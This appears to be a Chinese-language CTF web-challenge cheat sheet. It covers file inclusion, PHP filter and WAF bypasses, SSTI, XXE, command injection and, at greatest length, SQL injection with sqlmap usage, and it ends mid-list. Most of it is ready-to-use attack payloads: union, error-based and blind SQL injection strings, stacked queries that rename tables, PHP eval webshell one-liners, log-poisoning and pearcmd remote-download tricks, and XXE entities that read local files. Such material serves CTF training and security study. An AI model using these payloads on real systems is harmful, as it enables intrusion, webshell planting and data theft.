bp 试一下scan
       if(!preg_match("/php|file|\:|base|rot/i",$c)){
file,base,rot

sql, xpath报错只能显示32位。用left, mid right截取显示剩余部分


[TOC]
# 解题思路

信息搜集:bypass, 命令执行漏洞

注意文件上传马尽量UTF8编码

LFI - Local File Include
1. %00 截断问题 CVE-2020-7066
2. includes/class_<input>.php => includes/class_aaa/../../../../info
3. str_replace('../', '')   双写POC:  ..././ -> ../
4. 查看html隐藏字段提交
5. 查看 robots.txt, hint.txt, index.php, flag.php, index.php~, index.php.swp, 当前页 php
6. 二次编码,例 `"admin"!==x && urlencode(x) == 'admin'` , 二次encode x
7. filename  提示目录穿越
远程文件包含

1. php 相关

   1. 弱类型 "1b" == 1
   3. 空数组, sha1加密相同
   4. data://text/plain  传输内容, ?text=data://text/plain,I have a dream
   4. php://input        传输内容, ?text=php://input 改为POST请求, 在body传 I have a dream
   4. 获取文件内容 php://filter/ , ?file=php://filter/convert.base64-encode/resource=next.php
   5. 目录扫描+文件上传
   5. 文件上传
      
       6. .user.ini 绕过
       7. 脚本语言绕过 `<script language='php'> phpinfo();</script>`
   6. %00截断 <5.3
   6. 需要查看点: phpinfo()
   6. 参数测试 ?no=1, 添加`'`, ?no=1' 测试
   6. phar反序列化漏洞
      
   7. 执行漏洞

       assert 字符串参数当作php参数执行。 assert("phpinfo()"), 下面有详解
       preg_replace() php5.5 /e 代码执行漏洞, 与双引号执行
       create_function
       call_user_func
       call_user_func_array

   8. 查看rce章节
   11. [escapeshellarg](https://www.php.net/manual/zh/function.escapeshellarg.php#99213) 绕过, 使用非ascii字符比如 fl%7gag 绕flag
   12. 未过滤?和/   ?shell=/???/????64 /????????  -> /bin/base64 /flag.txt   , 同ctfshow web55
   13. 日志包含 ?c=/var/log/nginx/access.log, 如果包含user-agent请求头,写入一句话木马
          蚁剑连接/var/log/nginx/access.log
   
   14. ?c=pearcmd&+download+http://xx.yy/1.php           https://blog.csdn.net/qq_46091464/article/details/108954166

ssti注入 Twig: {{7*'7'}} 输出49  [BJDCTF2020]Cookie is so stable https://www.cnblogs.com/wkzb/p/12422190.html
        Jinja2 {{7*'7'}} 输出'7777777'


12.java类/Apache/jsp 见下面

11. shtml, Apache SSI 远程命令执行漏洞 `[BJDCTF2020]EasySearch`
5. xxe 漏洞 获取文件,比如API请求的题

8. sql
   
    1. union注入的使用
    1. 0x1 SQL 整数型注入
    1. 0x2 SQL 字符串型注入
    1. 0x3 SQL 报错注入
    1. 堆叠注入 `1;show databases;`,`1;show tables;`, `*,1`

    2. 实例 [SWPU2019]Web1 bypass informations
    3. 读取文件 [LOAD_FILE](#sql_loadfile)

其他

1. 看源码， 查找password, key ,flag
2. 看控制台 提示。
2. burpsuite看request 练习:`[BJDCTF 2nd]假猪套天下第一`
2. burpsuite看request - 有无 admin
2. burpsuite看request - 有无 flag
2. burpsuite看resopnse
2. burpsuite看History的response, 网页源码看不到, /POST的时候 会有变化。或者发到repeater手动提交看看。
3. 寻找信息 401.html 402.html 403.html 404.html
8. .git泄露
7. 扫描网站 扫后结果里先搜索.zip
7. 扫描网站
   
      1. register.php
      2. www.zip
      3. index.php.bak
2. 如果提供了文件，可以百度下文件名， 可能有信息
3. 使用 file_get_contents 获取 index.php 看源码。
3. 提示money要100000可以使用money[]=100000
3. 以指定端口访问  curl web.jarvisoj.com:32770 --local-port 51
4. 要求本地登录, locally, bp抓包，在上方添加,  
        1. X-Forwarded-For: 127.0.0.1
        2. client-ip: 127.0.0.1
5. 要求来自https://www.google.com -- bp抓包在上方添加, Referer:https://www.google.com
6. 要求email:   `From: root@gem-love.com`
7. 要求代理服务器/proxy:  `Via: y1ng.vip`
5. 要求管理员登录 请求时添加 admin=1, isadmin=1
6. ip 地址相关 X-Forwarded-For, 可能有模板注入, SSTI,smarty
   
    SSTI可使用 tplmap 检查
6. 未使用waf过滤时,比如ping输入框 , 见网鼎杯nmap

        127.0.0.1 && find / -name "*.txt"
        -c 3 -c 1 127.0.0.1 && cat /home/flag.txt

6. sql md5 加密注入

8. 过waf

    1. var_dump(scandir(/))
    2. 序列化
    3. 特殊字符绕过使用 <>，*，select，%，反引号，||，&, \
    3. `preg_match('/^[a-z0-9_]*$/isD',$act)` 绕过使用?act=\create_function&arg=){}system("ls");//
    4. 绕过 wakeup 见后面
    5. 绕过 php关键字 --- <?php 换成 <?= @eval($_POST["pd"]);?> -oG pd.phtml '
    6. 绕过 后缀黑名单 phtml .phps .php5 .pht, 见后面对apache设置
    6. 命令行注入escapeshellarg, escapeshellcmd,  `?host=' <?php @eval($_POST["hack"]);?> -oG hack.php '`
    6. 命令行注入escapeshellarg, escapeshellcmd,  `?host=' <?php echo `cat /flag`;?> -oG test.php '`
    7.  [PHP escapeshellarg()+escapeshellcmd() 之殇](https://paper.seebug.org/164/)



10. ssti , python/flask/django

        只给hello guest, 试试 ?name=123, ?name={{config}}, 可能是jwt要伪造admin
        h.encode('idna').decode('utf-8') 绕过 见 -- [SUCTF 2019]Pythonginx

11. xml实体注入 `[NCTF2019]True XML cookbook`

```xml
<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "file:///flag">
  ]>
<user><username>&admin;</username><password>123456</password></user>

注意上admin前有&

<?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE note [
  <!ENTITY admin SYSTEM "http://10.164.75.2">
  ]>
<user><username>&admin;</username><password>123456</password></user>
```

12. 常见读取文件

```
    /etc/passwd
    /etc/hosts
    /proc/net/arp     ,通过这里得到IP段，爆破
    .bash_history
```
11. 网站备份  index.php, index.php.bak, index.php~, .git/
12. GET请求改POST请求
12. Java项目 WEB-INF/web.xml
13. vim临时文件 swp swo : `vim -r ff.swp` `cat ff.swp`

## bypass绕过方式

    2. bypass informations:
```
    preg_match() 在匹配一次后停止搜索。
    检测是否区分大小写
    fuzz_list-regexbuddy测: 
        mysql -- sElect|uNion|.|or|"|'|^|0x|0b1111101000|?|sHow|orDer By|--|~~|`|CONcat|aLter|Columns|*|UpdateXml|ExtractValue|
        php函数-- system|exec|highlight_file|shell_exec|passthru|proc_open|phpinfo|popen|dl|eval|proc_terminate|touch|escapeshellcmd|escapeshellarg|assert|substr_replace|call_user_func_array|call_user_func|array_filter|array_walk|array_map|registregister_shutdown_function|register_tick_function|filter_var|filter_var_array|uasort|uksort|array_reduce|array_walk|array_walk_recursive|pcntl_exec|fopen|fwrite|file_put_contents|unserialize
        绕过技巧 $a='sys';$b='tem';$d=$a.$b;$d('cat config.php');
                ca""t
                base64|$a = base64_decode('c3lzdGVt');$b=base64_decode('Y2F0IGNvbmZpZy5waHA=');$a($b);
                assert闭合|assert(base64_decode(%27c3lzdGVtKCdjYXQgY29uZmlnLnBocCcp%27))?>|
                POST传参|?c=echo `$_POST[1]`?>|然后POST中-- 1=cat config.php
                POST传参|?c=echo `$_POST[1]`;|然后POST中-- 1=cat config.php
        linux命令 nl|od
 

    16进制 0x38e
    异或 200^800
        id=1000 -- preg_match("/\'|\"|or|\||\-|\\\|\/|\\*|\<|\>|\!|x|hex|\(|\)|\+|select/i",$id)  --> id=144^888

    按位与 992|8
    加减乘除都可以 --1000  负负得正
    ~~1000 == 1000


    空格 => /**/
    order by => group by
    测试列数 select * from ads where title = '$title' limit 0,1; 闭合替换$title
        $title ====> -1'/**/group/**/by/**/22,'1
        替换后: select * from ads where title = '-1'/**/group/**/by/**/22,'1' limit 0,1;
    显示看是哪一列 -1'/**/union/**/select/**/1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,'22
    取反码 preg_match("/[A-Za-z0-9]+/",$code)

    bypass select -- updatexml，用extractvalue
    by pass  /select|update|delete|drop|insert|where|\./i   强网杯随便注
        show, -1';show tables#, -1';show columns from `users`#
        -1';desc `1919810931114514`#
        -1';desc `words`#

        # 也可以用以下方式
        -1';show columns from `1919810931114514`#
        -1';show columns from `words`#
        
        方式1.预编译
        -1';Set @sql = CONCAT('se','lect * from `1919810931114514`;');Prepare stmt from @sql;EXECUTE stmt;#


        方式2.修改表名
        --原sql为 select * from words where id = ''; 修改为word表即可查
        1'; alter table words rename to words1;alter table `1919810931114514` rename to words;alter table words change flag id varchar(50);#
```

## 学习参考链接 Wiki

[CTF中Web题目的常见题型及解题姿势](https://mp.weixin.qq.com/s/b3NJgwh9_fR4BW-hKc0idA)

[渗透测试中如何快速拿到Webshell](https://mp.weixin.qq.com/s/4o3IRc_vC9jSW12Sf-6taA)

[CTF web 题型解题技巧-第一课 思路讲解](https://mp.weixin.qq.com/s/QGjP8mHz3ZYVlgQqEGawjw)

[CTF web 题型理论基础篇-第二课 理论基础](https://mp.weixin.qq.com/s/aJg-qVl9ZAZ3b2UfW2uL1Q)

[CTF web 题型流量分析-第三课 （ctf 之流量分析） 工具使用-流量分析](https://mp.weixin.qq.com/s/LVGBp9rzjGoQ-4zwJvDFLQ)

[CTF web 题型解题技巧-第四课 web总结](https://mp.weixin.qq.com/s/Yc2bZmVPO-akMCLKxfdAwQ)

[CTF web 题型总结 第五课-- CTF WEB 实战练习（一）](https://mp.weixin.qq.com/s/-xOlhBiOZF1FIvRXqH8eHQ)

[CTF web题型总结-第六课 CTF WEB实战练习(二)](https://mp.weixin.qq.com/s/Smz8azjp7F5oeyQkz5YM8w)

[CTF web题型总结-第七课 CTF WEB实战练习(三)](https://mp.weixin.qq.com/s/y9sbf1VV-JCtSQGYxTHdxw)

[SQL注入基础整理及Tricks总结](https://www.anquanke.com/post/id/205376)  [Link2](https://mp.weixin.qq.com/s/vdUoQU2WS7zf0EKHFYKNvg)

[闲谈Webshell实战应用](https://mp.weixin.qq.com/s/xKB64su2gJJ51ZKEF0PSKg)

[Getshell | 文件上传绕过整理](https://mp.weixin.qq.com/s/DpZyReQenYwg-5F_tx2u8A)

## php解题思路
1. 构建shell，看phpinfo

```php
    @$this->x()['Ginkgo'];
    $this->decode = @base64_decode( $this->code );
```
比如这样的构建 `eval($_POST['a']);` 转base64 => ?Ginkgo=ZXZhbCgkX1BPU1RbJ2EnXSk7 ,用蚁剑连这个地址。

构建 `a=phpinfo();` ，用hackbar post出去 `a=phpinfo();` 注意分号。

2. 绕过读取文件
   

[exp.php](https://github.com/mm0r1/exploits/blob/master/php7-gc-bypass/exploit.php)

修改一行 `pwn("/readflag");`

## 过waf等过滤
添加空格绕过，如[Web-[RoarCTF 2019]Easy Calc](https://www.cnblogs.com/gaonuoqi/p/11890094.html),限制了num，waf并没有限制'  num'，当php解析的时候，又会把'   num'前面的空格去掉在解析，利用这点来上传非法字符

    ? num=1;var_dump(scandir(chr(47))) // scandir(/)
    ? num=1;var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103))) # flagg

1. \指命名空间, 有的版本可用。Linux下可以添加 \ 来过, 比如 \system = system, ca\t = cat
```
POST
http://d0ee41d4-e9af-43bb-99e7-e3adcf19757d.node3.buuoj.cn/index.php?func=\system&p=find / -name flag*
```

2. 先序列化 echo serialize($a), 然后提交反序列化的内容

``` php
<?php
class Test {
    var $p = 'ls /';
    var $func = 'system';
}
$a = new Test;
echo serialize($a);
?>
// O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
// 比如func和p, 提交 func=unserialize&p=O:4:"Test":2:{s:1:"p";s:4:"ls /";s:4:"func";s:6:"system";}
```


## 查找flag的命令

`cat /*/flag; cat/*/*/flag; cat/*/*/*/flag`

`grep -r flag /`

# 工具/环境准备
Firefox + 插件 proxy, hackbar

Chrome + 插件 proxyomega + hackbar

    点击 Load URL, √Post data, 修改对应的字段
    点击 Execute

扫描工具
    
    wscan，ctf-wscan dirsearch之类的
        dirsearch: python dirsearch.py -u "http://node3.buuoj.cn/" -e * -s 1 --proxy=http://proxy2.dq.petrochina:8080 
        dirsearch: python dirsearch.py -u "http://node3.buuoj.cn/" -e php,asp,aspx,do,jsp -s 1 --proxy=http://proxy2.dq.petrochina:8080 
    nikto -h 10.1.1.147 -p 5002


[WEB CTF CheatSheet](https://github.com/w181496/Web-CTF-Cheatsheet#python)

# Sql 

## 测试
需要测试有的
```
post请求用#, GET请求用 %23
id=1                /*********/    1   union select 1,database(),3 #
id='1'              /*********/    1'  union select 1,database(),3 #
id=('1')            /*********/    1') union select 1,database(),3 #
id=("1")            /*********/    1") union select 1,database(),3 #
```

## 常见的SQL注入考点 CTF-123458

```
    1.联合查询: union select group_concat(username,0x7e,password),2,3 from...，order by...
    2.布尔盲注: (if(ascii(substr(database(),1,1))>100,1,0)
    3.时间盲注: (if(ascii(substr(database().1.1))>100,sleep(5).1)
    4.报错注入: (updatexml(1,concat(0x7e,(select user()),0x7e),1)); 大整数报错等
                'or updatexml(1,concat(0x7e,user()),1),1)#
                'or updatexml(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1)),1),1)#
                'or updatexml(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_schema=database() and table_name='flag_head')),1),1)#
                'or updatexml(1,concat(0x7e,(select group_concat(flag_h1) from flag_head)),1),1)#
    5.堆叠注入: select * from users where id= 1;create table test like users;
    6.二次注入:通过在一处输入点构造sql语句，在第二处触发
    7.宽字节注入:通过数据库编码错误来绕过字符转义
    8.WAF绕过:绕过过滤字符达到sql注入效果
    9.sql注入读写文件:通过sql注入写入webshell,或直接读取服务器文件
    10.sql注入提权:通过sql注 入获取服务器权限
    - 读取数据 见0x10
    - 绕过字符  /**/替换空格, 用<a>无意义填充过waf
    head 注入 useragent进行报错注入
```

1. 在用户名或密码处加引号测试

        http://[极客大挑战 2019]EasySQL/check.php?username=admin'&password=11
        报错 猜测  select * from users where name='$username' and passwd='$password';

PHP 优先级从高到低是：&&、||、and、or。

        $a || $b and $c || $d
        //相当于
        ($a || $b) and ($c || $d)

构造 username=admin or 1=1 和 passwd=admin or 1=1即可

        payload：?username=admin' or '1'='1&password=123' or '1'='1
        替换后:   name='admin' or '1'='1' and passwd='123' or '1'='1';

其他万能密码, 有时不能为空（过滤了空字符）

    1' or 1=1 #
    uname=1' or 1=1 #&passwd=any
    uname=1' or '1=1'#&passwd=any
    select * from user where uname = '222' and upass = '222' 
    select * from user where uname = '222' and upass = '222' or 1=1
    select * from user where uname = '222' and upass = '222' or '1=1#'
    select * from user where uname = '222' and upass = '222' or '1'='1'

过滤空格, 用/**/代替
    
    先输入1，再输入1'，页面报语法错误，再输入1 '页面出现SQLi detected!，推出空格被它过滤了
    '/**/or/**/id=4/**/union/**/select/**/table_name/**/from/**/information_schema.tables/**/where/**/'1'='1

```
/*!union*/ 绕过union过滤
```

fuzz后能用 
```python
"0^" + "(ascii(substr((select(flag)from(flag)),{0},1))>{1})".format(i,mid)
# '0^(ascii(substr((select(flag)from(flag)),1,1))>94)'
```
## 基础介绍

### 如何判断注入点
GET请求不要用#, 用%23代替
POST请求要用#

1.数字型: id=1 and 1=2，id= 3-2; id=0!=1 ，id=1 in(1,2)..   # 3-2返回结果是1的数据
    可用符号: +,-,*,/,<,>,<=,=>,!等
    关键字: like， and，or， in ，between等
    语句通常为: SELECT 列FROM表WHERE数字型列=值
2.字符型: id= 1' and '1'='2， id=1'!=1 %23， id=1'!=1--+...      # %20或+ 表示空格, url编码 即 --+ -> --空格
    可用符号与关键字与数字型相同，区别在于需要将引号闭合
    语句通常为: SELECT 列FROM表WHERE字符型列='值  ’
    id='1'
    id='1' union select 1,2,'3'
          payload: 1' union select 1,2,'3
3.搜索型: id =1%' and 1=1--+...
    区别在于搜索类型常使用%，需要从返回结果中判断
    语句通常为: SELECT * FROM表WHERE where被搜索的列like ' %值%'

常见问题
只能 from table_name 不能  from 'tname', "tname"



## 常见方式
### 双写绕过 admin' oorr '1'='1

    admin' oorr '1'='1
### 0x1 SQL 整数型注入 2341 union select database(),2
https://blog.csdn.net/weixin_44732566/article/details/104340658

默认sql: select * form news where id=?

0.查数据库

payload:`2343 union select database(),2`

    返回sqli
    id=2343在数据库中是不存在的，所有返回NULL，因为前端页面只有ID，Data两处地方可以回显数据
    这样union select查询的数据就可以回显了

#### information_schema三步

1.查表名

    select * from news where id=2343 union select group_concat(table_name),3 from information_schema.tables where table_schema='sqli'
    返回flag

2.查字段名
    
    select * from news where id=2343 union select group_concat(column_name),3 from information_schema.columns where table_name='flag'
    返回字段flag

3.查数据

    select * from news where id=2343 union select flag,3 from sqli
    select * from news where id=2343 union select group_concat(flag),3 from sqli
    返回目标值

一、常用函数

    1、database()：当前网站使用的数据库
    2、version()：当前MySQL版本
    3、user()：当前MySQL的用户

二、MySQL默认有“information_schema”的数据库，该库中有三个表名：

    1、SCHEMATA：存储该用户创建的所有数据库的库名，记录库名的字段为SCHEMA_NAME。
    2、TABLES：存储该用户创建的所有数据库的库名和表名，记录库名和表名的字段为TABLE_SCHEMA和TABLE_NAME。
    3、COLUMNS：存储该用户创建的所有数据库的库名、表名和字段名，库名、表名和字段名为TABLE_SCHEMA、TABLE_NAME和COLUMN_NAME。

### union注入: -1 union select database(),2;
三、union注入

    # 是行注释
    union操作符将两个SQL查询语句连接了起来，当设置id参数为-1时，由于没有id=-1的数据，因此会返回union后的查询语句的结果。
    
    select * from line_tour where id=-1 union select database(),2;
        select database(),2 是两列，前面的结果也要是二两列能返回结果
    
    select * from line_tour where id=-1 union select database(),2,3,4,5,6,7;

__select 和union的列数要相同才会返回结果__

![](./imgs/web_sql2.png)
### 双写
### 堆叠注入
### 0x2 SQL 字符串型注入: 1' and 1=1

测试注入，有没回显或错误
    
    1' and 1=1#

order by x找出该数据表的字段数量
    
    1' order by 1#，1' order by 2#，返回结果相同，输入1' order by 3#返回结果不同，证明字段数为2。

爆数据库名
    
    payload: -1' union select database(),2#
    select * from news where id='-1' union select database(),2#

1.查表名

    -1' union select group_concat(table_name),2 from information_schema.tables where table_schema='sqli'#
    select * from news where id='-1' union select group_concat(table_name),3 from information_schema.tables where table_schema='sqli'#
    返回news,flag

2.查字段名
    
    -1' union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#
    select * from news where id='-1' union select group_concat(column_name),2 from information_schema.columns where table_name='flag'#'
    返回字段flag

3.查数据

    -1' union select flag,1 from sqli.flag#
    select * from news where id='-1' union select flag,1 from sqli.flag#'
    返回目标值

### 0x3 SQL 报错注入: admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&password=21
![报错原理解析](articles/sql错误注入.md)

1. 使用updatexml报错法注入:  admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&password=21
2. 

https://www.cnblogs.com/anweilx/p/12464859.html
https://www.cnblogs.com/Cl0ud/p/12419200.html
https://blog.csdn.net/qq_45653588/article/details/106342571
https://blog.csdn.net/weixin_44732566/article/details/104417351

方法1 updatexml -- 极客大挑战 2019]HardSQL

```
查version
username=admin'or(updatexml(1,concat(0x7e,version(),0x7e),1))%23&password=21
查database
username=admin'or(updatexml(1,concat(0x7e,database(),0x7e),1))%23&password=21
查表
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e),1))%23&password=21
查字段
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name)like('H4rDsq1')),0x7e),1))%23&password=21
查数据
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(username,'~',password))from(H4rDsq1)),0x7e),1))%23&password=21
看wp说用right()语句在查询后面部分 只查到了一半再用left()right()语句查询拼接
username=admin'or(updatexml(1,concat(0x7e,(select(group_concat(right(password,25)))from(H4rDsq1)),0x7e),1))%23&password=21

---
用extractvalue一样, 少一个,1的参数
?username=admin'or(extractvalue(1,concat(0x7e,user(),0x7e)))%23&password=21
?username=admin'or(extractvalue(1,concat(0x7e,database(),0x7e)))%23&password=21
?username=admin'or(extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema)like(database())),0x7e)))%23&password=pass
?username=admin'or(extractvalue(1,concat(0x7e,(select(group_concat(password))from(H4rDsq1)),0x7e)))%23&password=pass
?username=admin'or(extractvalue(1,concat(0x7e,(select(group_concat(right(password,30)))from(H4rDsq1)),0x7e)))%23&password=pass

```

方法2

测试

    1#
    select * from news where id=1#
    查询正确 => 判断出为整形的报错注入

查询数据库名

    1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
                                                                   // from information_schema.columns 可以是别的，但一定要有数据
    select 1 Union select count(*),2 group by concat(database(),floor(rand(0)*2)); //简化版
    看有几列填几个数
    1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
    select 1 Union select count(*),concat(database(),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
    select 1 Union select count(*),concat((查询语句),0x26,floor(rand(0)*2))x from information_schema.columns group by x;
    select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.columns group by a;

查表名

    select 1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
    select 1 Union select count(*),concat((select table_name from information_schema.tables where table_schema='sqli' limit 1,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
    多个表需要挨个试验

查字段名

    1 Union select count(*),concat((select column_name from information_schema.columns where table_name='flag' limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x
    返回flag

查数据
    
    1 Union select count(*),concat((select flag from flag limit 0,1),0x26,floor(rand(0)*2))x from information_schema.columns group by x

### 0x4 SQL union生成虚拟表 md5 绕过: name=1' union select 1,'admin','e10adc3949ba59abbe56e057f20f883e'#&pw=123456
`[GXYCTF2019]BabySQli`
https://www.jianshu.com/p/034cfa61a305
https://www.cnblogs.com/gaonuoqi/p/12355035.html

### 0x5 盲注
`[极客大挑战 2019]FinalSQL`

```
id=0^(1) 可返回数据时
```
https://www.cnblogs.com/hello-there/p/13026698.html
http://www.pdsdt.lovepdsdt.com/index.php/2019/11/19/2019_geek_web/


1^(ord(substr((select(group_concat(schema_name))from(information_schema.schemata)),%d,1))=%d)^1"%(i,ord(j)) 获取数据库名称

1^(ord(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema)='geek'),%d,1))=%d)^1"%(i,ord(j)) 获取数据库表名

```
1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" %(i,mid)# i d是参数
或
1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),%d,1))=%d)^1"%(i,ord(j))
```

语句分析

```
SET NAMES utf8mb4;
DROP TABLE IF EXISTS `user`;
CREATE TABLE `user`  (
  `id` int(11) NULL DEFAULT NULL,
  `password` varchar(255) CHARACTER SET latin1 COLLATE latin1_swedish_ci NULL DEFAULT NULL
) ENGINE = InnoDB CHARACTER SET = latin1 COLLATE = latin1_swedish_ci ROW_FORMAT = Dynamic;
INSERT INTO `user` VALUES (NULL, 'pwd1');
INSERT INTO `user` VALUES (NULL, 'pwd2');

select group_concat(password) from user  -- pwd1,pwd2
select substr((select group_concat(password) from user),1,1)  -- p
select ascii(substr((select group_concat(password) from user),1,1)) -- 112
select (ascii(substr((select group_concat(password) from user),1,1)) > 1) -- 1
select 1^(ascii(substr((select group_concat(password) from user),1,1)) > 1) -- 0
```


1.fuzz字典
```
and
aNd
or
oR
oorr
select
sElect
union
unIon
union select
union/**/select
/**/
 
 '
 "
 \
 information_schema
 ^
 &&
 uniOn/**/select
```


`''`没有被过滤，输入11回显`'ERROR',1^0回显'NO! Not this! Click others~~~'`，判断出为数字型注入。

由于空格被过滤，用()代替，我这里payload直接写到了最后一步，猜解表名，字段名的payload我这里就不写了，直接去嵌套常规的联合查询语句即可。

```
payload = "http://33e8c85b-d0d4-4777-9143-702ddf10ee0e.node3.buuoj.cn/search.php?id=1^(ascii(substr((select(group_concat(password))from(F1naI1y)),%d,1))>%d)" %(i,mid)
```


### 0x4 布尔注入
https://blog.csdn.net/weixin_44732566/article/details/104455318

可以看到id=1 and 1=1 => success 和id=1 and 1=2 =>error，所以我们使用if(expr1,expr2,expr3)函数来盲注
    
    if(expr1,expr2,expr3)，如果expr1的值为true，则执行expr2语句，如果expr1的值为false，则执行expr3语句。

判断语句，当第一条语句是正确就执行第二条语句，不正确就执行第三条语句, 子查询要求返回结果只有一条记录,否则报错
    
    子查询格式：select * from users where id=(select username from users);

判断数据库名第一位为's':
    
    payload: select * from news where id=if(substr(database(),1,1)='s',1,(select table_name from information_schema.tables))
    循环脚本爆破
    payload: select * from news where id=if(substr(database(),%d,1)='%s',1,(select table_name from information_schema.tables))

查table
    # 查全部表
    select * from user where id=1  and ord( SUBSTR((select group_concat(table_name) from information_schema.tables where table_schema=database()),1,1))>97;
    # 查表个数
    select * from user where id=1 and (select count(*) from information_schema.tables where table_schema=database())= 表的个数 %23
    # 查表
    select * from user where id=1  and ord(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))>97
    select * from user where id=1  and ord(substr((select table_name from information_schema.tables where table_schema=database() limit 第几个表,1),1,1))=字符ascii值

    
    url = urlOPEN+'if(substr((select table_name from information_schema.tables where table_schema=database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)
    解析
        select table_name from information_schema.tables where table_schema=database() -- 查当前数据库所有表
        select table_name from information_schema.tables where table_schema=database() limit %d,1 -- 所有表中的%d行

column

    select * from user where id=1 and ord( SUBSTR((select group_concat(column_name) from information_schema.columns where table_name="{}"),{},1))>{}'
    url=urlOPEN+'if(substr((select column_name from information_schema.columns where table_name="flag"and table_schema= database() limit %d,1),%d,1)="%s",1,(select table_name from information_schema.tables))' %(k,j,i)

data
    
    url=urlOPEN+'if(ascii(substr((select flag from flag),%d,1))=%d,1,(select table_name from information_schema.tables))' %(j,i)

### 0x10读取文件

load_file配合mid

    select load_file('E:\flag.txt')
    select ascii(mid((select load_file('E:\flag.txt')),1,1));
    select ascii(mid((select load_file('E:\flag.txt')),2,1)); -- 1,2,3逐位读取再转换成字符


直接注入表读取

    create table abc(cmd text);
    insert into abc(cmd) values (load_file('E:\flag.txt'));
    select * from abc;


### 其他 sql 使用方法

#### extractvalue

```
用户名
1' and (extractvalue(1,concat(0x7e,user(),0x7e)));#
error 1105 : XPATH syntax error: '~root@localhost~'

数据库

1' and (extractvalue(1,concat(0x7e,database(),0x7e)));#
error 1105 : XPATH syntax error: '~supersqli~'

版本
1' and (extractvalue(1,concat(0x7e,version(),0x7e)));#
```
## 示例

网鼎杯 2018 Fakebook



网鼎杯 2018 Fakebook
```
/view.php?no=1 and 1=1
/view.php?no=1 and 1=2
/view.php?no=1 order by 5
//发现过滤了union select 使用注释绕过
/view.php?no=-1 union/**/select 1,2,3,4
/view.php?no=-1 union/**/select 1,database(),3,4
//得到数据库数据fakebook 
/view.php?no=-1 union/**/select 1,group_concat(table_name),3,4 from information_schema.tables where table_schema=database()
//得到表名数据:users 
/view.php?no=-1 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_name='users'
//得到字段数据:no,username,passwd,data
/view.php?no=-1 union/**/select 1,group_concat(data),3,4 from users
//得到data字段下数据:O:8:"UserInfo":3:{s:4:"name";s:7:"xiaohua";s:3:"age";i:12;s:4:"blog";s:9:"baidu.com";} 
```


## 工具
### sqlmap
https://blog.csdn.net/Litbai_zhang/article/details/87939785

#### FAQ

测试有无post注入

`sqlmap -u http://vip.fj0730.cn/login.asp --forms`

#### sqlmap manual

[SQLMap命令详解及使用操作](https://blog.csdn.net/yinghua1234/article/details/105999231?utm_source=app)

[tamper](https://securityonline.info/sqlmap-tamper-script-bypassing-waf/)

将请求保存成3.txt

sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment

sqlmap  -r 3.txt --technique T --level 3 --tamper=space2comment -D injection -T admin --dump

sqlmap -u "http://xx"

sqlmap -u "http://可能注入的某个提交参数的url" --cookie="这次提交的cookie"

    浏览器url栏输入 javascript:document.cookie或者在console栏中输入document.cookie即可获得cookie

查看 database

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" --current-db --batch
    # web1

查看表

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 --tables

查看列

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag --columns
    # 遇到提示选y

查看flag信息

    sqlmap -u http://ctf5.shiyanbar.com/web/index_2.php?id=1 --tamper "space2comment.py" -D web1 -T flag -C flag --dump


--technique

指定sqlmap使用的检测技术，默认情况下会测试所有的方式。

Boolean-based blind

Error-based

Union query-based

Stacked queries(对文件系统、操作系统、注册表操作时，必须指定该方式)

Time-based blind

--time-sec

设置延迟时间，基于时间的注入检测默认延迟时间是5秒

--union-cols

联合查询时默认是1-10列，当level=5时会增加到测试50个字段数，可以使用此参数设置查询的字段数。

--union-char

默认情况下sqlmap针对UNION查询的注入会使用NULL字符；

有些情况下使用NULL字符会造成页面返回失败，而使用一个随机整数是成功的，可以使用--union-char指定UNION查询的字符。

--dns-domain

攻击者控制了某DNS服务器，使用此功能可以提高数据查询的速度

例如：--dns-domain="attacker.com"

--second-order

有些时候注入点输入的数据，返回的结果并不是当前页面，而是另外一个页面。

使用此参数指定到哪个页面获取响应判断真假，--second-order后面跟一个判断页面的URL地址。例如：

--second-order="http://1.1.1.1/a.php"


[SQLMap中tamper的简介](https://blog.csdn.net/Litbai_zhang/article/details/99681398)
#### sqlmap 常用方法

常用方法

    1.查数据库
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch --dbs
        python sqlmap.py -u http://challenge-b6a3a184decf6636.sandbox.ctfhub.com:10080/?id=1 --batch --current-db
    2.查表名
